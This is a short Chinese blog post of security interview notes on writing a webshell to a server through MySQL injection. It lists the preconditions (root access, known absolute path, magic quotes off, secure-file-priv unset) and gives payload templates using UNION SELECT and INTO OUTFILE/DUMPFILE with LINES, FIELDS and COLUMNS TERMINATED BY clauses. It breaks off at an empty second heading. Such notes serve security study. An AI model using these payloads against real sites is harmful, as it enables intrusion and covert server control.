---
layout: post_layout
title: 面试笔记
time: 2019年03月12日 星期四
location: 杭州
pulished: true
excerpt_separator: "```"
---

#### 1.如何利用 Mysql 注入写入 webshell。

**(1)利用条件**

① root 权限

② 绝对路径

③ GPC = off （能使用单引号）

④ mysql 配置文件 my.ini 中的参数 secure-file-priv 未配置或设置为网站根目录

```
关于③：
PHP 魔术引号，有三种，一般指 magic_quotes_gpc 选项，默认为 on。可对单引号、双引号、反斜杠、NULL 进行转义，功能与 addslashes() 相同。因与 addslashes() 相比可移植性差、性能低、不方便等原因，已在 PHP5.4 版本被移除。
```
```
关于④：
如果该变量为空，则变量无效，这时候最容易利用。
如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件。
如果设置为NULL，则服务器禁用导入和导出操作。
```

**(2)Payload**

可以使用联合查询时：`id=1' union select [webshell] into outfile/dumpfile [绝对路径]`

无法使用联合查询时：

```
id=1' into outfile [绝对路径] lines starting by [webshell]
id=1' into outfile [绝对路径] lines terminated by [webshell]
id=1' into outfile [绝对路径] fields terminated by [webshell]
id=1' into outfile [绝对路径] columns terminated by [webshell]
```

#### 2.